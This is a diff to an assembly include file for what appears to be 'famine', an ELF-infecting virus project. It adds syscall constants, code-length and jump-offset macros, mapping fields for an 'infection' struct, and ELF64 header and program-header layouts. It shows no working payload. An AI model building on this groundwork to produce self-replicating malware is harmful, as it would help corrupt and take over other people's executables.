@@ -5,6 +5,7 @@
 %define     SYS_CLOSE       3
 %define		SYS_LSEEK		8
 %define		SYS_MMAP		9
+%define		SYS_UNMAP		11
 %define     SYS_EXIT        60
 %define     SYS_GETDENTS    217
 %define     SYS_SOCKET      41
@@ -49,6 +50,10 @@
 %define		SOCK(x)				[(rbp - sock_size) + x]
 %define		INF(x)				[(rbp - infection_size) + x]
 
+%define		CODE_LEN			(_end - _start)
+%define		FINJMP_OFF			(_bf_exit - _start)
+%define		PAGE_SIZE			0x1000
+
 struc famine
     .pwd                resb    PAGE_SIZE
     .dirents:           resb    PAGE_SIZE
@@ -58,8 +63,42 @@ struc famine
     .dirents_struct_ptr resq    1
 endstruc
 
+
 struc infection
 	.file_fd	resq	1
+	.map		resq	1
+	.map_size	resq	1
+endstruc
+
+%define	PT_LOAD	0x1
+%define PF_X	0x1
+
+struc	elf64_ehdr
+	.e_ident:		resb	16
+	.e_type:		resw	1
+	.e_machine:		resw	1
+	.e_version:		resd	1
+	.e_entry:		resq	1
+	.e_phoff:		resq	1
+	.e_shoff:		resq	1
+	.e_flags:		resd	1
+	.e_ehsize:		resw	1
+	.e_phentsize:	resw	1
+	.e_phnum:		resw	1
+	.e_shentsize:	resw	1
+	.e_shnum:		resw	1
+	.e_shstrndx:	resw	1
+endstruc
+
+struc	elf64_phdr
+	.p_type:		resd	1
+	.p_flags:		resd	1
+	.p_offset:		resq	1
+	.p_vaddr:		resq	1
+	.p_paddr:		resq	1
+	.p_filesz:		resq	1
+	.p_memsz:		resq	1
+	.p_align:		resq	1
 endstruc
 
 %macro writeWork 0
